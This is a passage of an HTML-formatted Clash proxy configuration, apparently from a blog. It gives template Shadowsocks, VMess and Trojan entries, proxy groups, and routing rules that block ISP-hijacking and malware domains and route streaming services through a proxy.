443</span><br><span class="line">  cipher: chacha20-ietf-poly1305</span><br><span class="line">  password: &quot;password&quot;</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">udp: <span class="literal">true</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Shadowsocks(simple-obfs)</span></span><br><span class="line">- name: &quot;ss-obfs&quot;</span><br><span class="line">  type: ss</span><br><span class="line">  server: server</span><br><span class="line">  port: 443</span><br><span class="line">  cipher: chacha20-ietf-poly1305</span><br><span class="line">  password: &quot;password&quot;</span><br><span class="line">  plugin: obfs</span><br><span class="line">  plugin-opts:</span><br><span class="line">      mode: tls</span><br><span class="line">      host: example.com</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Shadowsocks(v2ray-plugin)</span></span><br><span class="line">- name: &quot;ss-v2ray&quot;</span><br><span class="line">  type: ss</span><br><span class="line">  server: server</span><br><span class="line">  port: 443</span><br><span class="line">  cipher: chacha20-ietf-poly1305</span><br><span class="line">  password: &quot;password&quot;</span><br><span class="line">  plugin: v2ray-plugin</span><br><span class="line">  plugin-opts:</span><br><span class="line">    mode: websocket # no QUIC now</span><br><span class="line">    # tls: true # wss</span><br><span class="line">    # skip-cert-verify: true</span><br><span class="line">    # host: bing.com</span><br><span class="line">    # path: &quot;/&quot;</span><br><span class="line">    # mux: true</span><br><span class="line">    # headers:</span><br><span class="line">    #   custom: value</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">VMess</span></span><br><span class="line">- name: &quot;v2ray&quot;</span><br><span class="line">  type: vmess</span><br><span class="line">  server: ****（填写自己的）</span><br><span class="line">  port: ***（填写自己的）</span><br><span class="line">  uuid: 30750937-2ed5-4782-9e66-6fc61ea7e4f3</span><br><span class="line">  alterId: 0</span><br><span class="line">  cipher: auto</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">udp: <span class="literal">true</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">tls: <span class="literal">true</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">skip-cert-verify: <span class="literal">true</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">tls-hostname: 填写伪装域名</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">network: ws</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">ws-path: /path</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">ws-headers: <span class="comment">#这一行后面不要写东西</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">  Host: v2ray.com <span class="comment"># 填写伪装域名</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Trojan</span></span><br><span class="line">- name: &quot;trojan&quot;</span><br><span class="line">  type: trojan</span><br><span class="line">  server: server</span><br><span class="line">  port: 443</span><br><span class="line">  password: password</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">udp: <span class="literal">true</span></span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">sni: example.com <span class="comment"># 填写伪装域名</span></span></span><br><span class="line">  alpn:</span><br><span class="line">     - h2</span><br><span class="line">     - http/1.1</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">skip-cert-verify: <span class="literal">true</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">代理组策略</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">策略组示例请查阅 Clash 项目 README 以使用最新格式：https://github.com/Dreamacro/clash/blob/master/README.md</span></span><br><span class="line">proxy-groups:</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">url-test 通过指定的 URL 测试并选择延迟最低的节点</span></span><br><span class="line">- name: &quot;自动选择快速节点&quot;</span><br><span class="line">  type: url-test</span><br><span class="line">  proxies:</span><br><span class="line">    - &quot;ss&quot;</span><br><span class="line">    - &quot;ss-obfs&quot;</span><br><span class="line">    - &quot;ss-v2ray&quot;</span><br><span class="line">    - &quot;v2ray&quot;</span><br><span class="line">    - &quot;trojan&quot;</span><br><span class="line">  url: &#x27;http://www.gstatic.com/generate_204&#x27;</span><br><span class="line">  interval: 300</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">fallback 通过指定的 URL 测试并选择可用的节点，当 1 故障不可用时自动切换到 2 以此类推</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">- name: <span class="string">&quot;Fallback&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  <span class="built_in">type</span>: fallback</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  proxies:</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    - <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    - <span class="string">&quot;2&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    - <span class="string">&quot;3&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    - <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  url: <span class="string">&#x27;http://www.gstatic.com/generate_204&#x27;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  interval: 300</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">load-balance: 负载均衡</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">- name: <span class="string">&quot;LoadBalance&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  <span class="built_in">type</span>: load-balance</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  proxies:</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    - <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    - <span class="string">&quot;2&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    - <span class="string">&quot;3&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    - <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  url: <span class="string">&#x27;http://www.gstatic.com/generate_204&#x27;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  interval: 300</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">代理节点选择</span></span><br><span class="line">- name: &quot;PROXY&quot;</span><br><span class="line">  type: select</span><br><span class="line">  proxies:</span><br><span class="line">    - &quot;自动选择快速节点&quot;</span><br><span class="line">    - &quot;ss&quot;</span><br><span class="line">    - &quot;ss-obfs&quot;</span><br><span class="line">    - &quot;ss-v2ray&quot;</span><br><span class="line">    - &quot;v2ray&quot;</span><br><span class="line">    - &quot;trojan&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">白名单模式 PROXY，黑名单模式 DIRECT</span></span><br><span class="line">- name: &quot;Final&quot;</span><br><span class="line">  type: select</span><br><span class="line">  proxies:</span><br><span class="line">    - &quot;DIRECT&quot;</span><br><span class="line">    - &quot;PROXY&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Apple 服务代理</span></span><br><span class="line">- name: &quot;Apple&quot;</span><br><span class="line">  type: select</span><br><span class="line">  proxies:</span><br><span class="line">    - &quot;DIRECT&quot;</span><br><span class="line">    - &quot;PROXY&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">国际流媒体服务</span></span><br><span class="line">- name: &quot;GlobalMedia&quot;</span><br><span class="line">  type: select</span><br><span class="line">  proxies:</span><br><span class="line">    - &quot;PROXY&quot;</span><br><span class="line">    - &quot;ss&quot;</span><br><span class="line">    - &quot;ss-obfs&quot;</span><br><span class="line">    - &quot;ss-v2ray&quot;</span><br><span class="line">    - &quot;v2ray&quot;</span><br><span class="line">    - &quot;trojan&quot;</span><br><span class="line"><span class="meta"># </span><span class="language-bash">大陆流媒体面向港澳台限定服务</span></span><br><span class="line">- name: &quot;HKMTMedia&quot;</span><br><span class="line">  type: select</span><br><span class="line">  proxies:</span><br><span class="line">    - &quot;DIRECT&quot;</span><br><span class="line">    - &quot;ss&quot;</span><br><span class="line">    - &quot;ss-obfs&quot;</span><br><span class="line">    - &quot;ss-v2ray&quot;</span><br><span class="line">    - &quot;v2ray&quot;</span><br><span class="line">    - &quot;trojan&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">规则</span></span><br><span class="line">rules:</span><br><span class="line"><span class="meta"># </span><span class="language-bash">Unbreak</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Google</span></span><br><span class="line">- DOMAIN-SUFFIX,googletraveladservices.com,DIRECT</span><br><span class="line">- DOMAIN,dl.google.com,DIRECT</span><br><span class="line">- DOMAIN,mtalk.google.com,DIRECT</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Internet Service Providers Hijacking 运营商劫持</span></span><br><span class="line">- DOMAIN-SUFFIX,17gouwuba.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,186078.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,189zj.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,285680.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,3721zh.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,4336wang.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,51chumoping.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,51mld.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,51mypc.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,58mingri.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,58mingtian.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,5vl58stm.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,6d63d3.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,7gg.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,91veg.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,9s6q.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,adsame.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,aiclk.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,akuai.top,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,atplay.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,baiwanchuangyi.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,beerto.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,beilamusi.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,benshiw.net,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,bianxianmao.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,bryonypie.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,cishantao.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,cszlks.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,cudaojia.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,dafapromo.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,daitdai.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,dsaeerf.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,dugesheying.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,dv8c1t.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,echatu.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,erdoscs.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,fan-yong.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,feih.com.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,fjlqqc.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,fkku194.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,freedrive.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,gclick.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,goufanli100.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,goupaoerdai.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,gouwubang.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,gzxnlk.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,haoshengtoys.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,hyunke.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,ichaosheng.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,ishop789.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,jdkic.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,jiubuhua.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,jsncke.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,junkucm.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,jwg365.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,kawo77.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,kualianyingxiao.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,kumihua.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,ltheanine.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,maipinshangmao.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,minisplat.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mkitgfs.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mlnbike.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mobjump.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,nbkbgd.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,newapi.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,pinzhitmall.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,poppyta.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,qianchuanghr.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,qichexin.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,qinchugudao.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,quanliyouxi.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,qutaobi.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,ry51w.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sg536.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sifubo.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sifuce.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sifuda.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sifufu.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sifuge.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sifugu.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sifuhe.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sifuhu.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sifuji.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,sifuka.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,smgru.net,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,taoggou.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,tcxshop.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,tjqonline.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,topitme.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,tt3sm4.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,tuia.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,tuipenguin.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,tuitiger.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,websd8.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,wsgblw.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,wx16999.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,xchmai.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,xiaohuau.xyz,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,ygyzx.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,yinmong.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,yitaopt.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,yjqiqi.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,yukhj.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,zhaozecheng.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,zhenxinet.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,zlne800.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,zunmi.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,zzd6.com,REJECT</span><br><span class="line">- IP-CIDR,39.107.15.115/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,47.89.59.182/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,103.49.209.27/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,123.56.152.96/32,REJECT,no-resolve</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; ChinaTelecom</span></span><br><span class="line">- IP-CIDR,61.160.200.223/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,61.160.200.242/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,61.160.200.252/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,61.174.50.214/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,111.175.220.163/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,111.175.220.164/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,122.229.8.47/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,122.229.29.89/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,124.232.160.178/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,175.6.223.15/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,183.59.53.237/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,218.93.127.37/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,221.228.17.152/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,221.231.6.79/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,222.186.61.91/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,222.186.61.95/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,222.186.61.96/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,222.186.61.97/32,REJECT,no-resolve</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; ChinaUnicom</span></span><br><span class="line">- IP-CIDR,106.75.231.48/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,119.4.249.166/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,220.196.52.141/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,221.6.4.148/32,REJECT,no-resolve</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; ChinaMobile</span></span><br><span class="line">- IP-CIDR,114.247.28.96/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,221.179.131.72/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,221.179.140.145/32,REJECT,no-resolve</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Dr.Peng</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">- IP-CIDR,10.72.25.0/24,REJECT,no-resolve</span></span><br><span class="line">- IP-CIDR,115.182.16.79/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,118.144.88.126/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,118.144.88.215/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,118.144.88.216/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,120.76.189.132/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,124.14.21.147/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,124.14.21.151/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,180.166.52.24/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,211.161.101.106/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,220.115.251.25/32,REJECT,no-resolve</span><br><span class="line">- IP-CIDR,222.73.156.235/32,REJECT,no-resolve</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Malware 恶意网站</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; 快压</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">https://zhuanlan.zhihu.com/p/39534279</span></span><br><span class="line">- DOMAIN-SUFFIX,kuaizip.com,REJECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; MacKeeper</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">https://www.lizhi.io/blog/40002904</span></span><br><span class="line">- DOMAIN-SUFFIX,mackeeper.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,zryydi.com,REJECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Adobe Flash China Special Edition</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">https://www.zhihu.com/question/281163698/answer/441388130</span></span><br><span class="line">- DOMAIN-SUFFIX,flash.cn,REJECT</span><br><span class="line">- DOMAIN,geo2.adobe.com,REJECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; C&amp;J Marketing 思杰马克丁软件</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">https://www.zhihu.com/question/46746200</span></span><br><span class="line">- DOMAIN-SUFFIX,4009997658.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,abbyychina.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,bartender.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,betterzip.net,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,betterzipcn.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,beyondcompare.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,bingdianhuanyuan.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,chemdraw.com.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,cjmakeding.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,cjmkt.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,codesoftchina.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,coreldrawchina.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,crossoverchina.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,dongmansoft.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,earmasterchina.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,easyrecoverychina.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,ediuschina.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,flstudiochina.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,formysql.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,guitarpro.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,huishenghuiying.com.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,hypersnap.net,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,iconworkshop.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,imindmap.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,jihehuaban.com.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,keyshot.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,kingdeecn.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,logoshejishi.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,luping.net.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mairuan.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mairuan.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mairuan.com.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mairuan.net,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mairuanwang.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,makeding.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mathtype.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mindmanager.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mindmanager.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mindmapper.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,mycleanmymac.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,nicelabel.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,ntfsformac.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,ntfsformac.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,overturechina.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,passwordrecovery.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,pdfexpert.cc,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,photozoomchina.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,shankejingling.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,ultraiso.net,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,vegaschina.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,xmindchina.net,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,xshellcn.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,yihuifu.cn,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,yuanchengxiezuo.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,zbrushcn.com,REJECT</span><br><span class="line">- DOMAIN-SUFFIX,zhzzx.com,REJECT</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Global Area Network</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">(GlobalMedia)</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">(Music)</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Deezer</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,Deezer*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,deezer.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,dzcdn.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; KKBOX</span></span><br><span class="line">- DOMAIN-SUFFIX,kkbox.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,kkbox.com.tw,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,kfs.io,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; JOOX</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,WeMusic*,GlobalMedia</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,JOOX*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,joox.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Pandora</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,Pandora*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,pandora.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; SoundCloud</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,SoundCloud*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,p-cdn.us,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,sndcdn.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,soundcloud.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Spotify</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,Spotify*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,pscdn.co,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,scdn.co,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,spotify.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,spoti.fi,GlobalMedia</span><br><span class="line">- DOMAIN-KEYWORD,spotify.com,GlobalMedia</span><br><span class="line">- DOMAIN-KEYWORD,-spotify-com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; TIDAL</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,TIDAL*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,tidal.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; YouTubeMusic</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,com.google.ios.youtubemusic*,GlobalMedia</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,YouTubeMusic*,GlobalMedia</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">(Video)</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; All4</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,All4*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,c4assets.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,channel4.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; 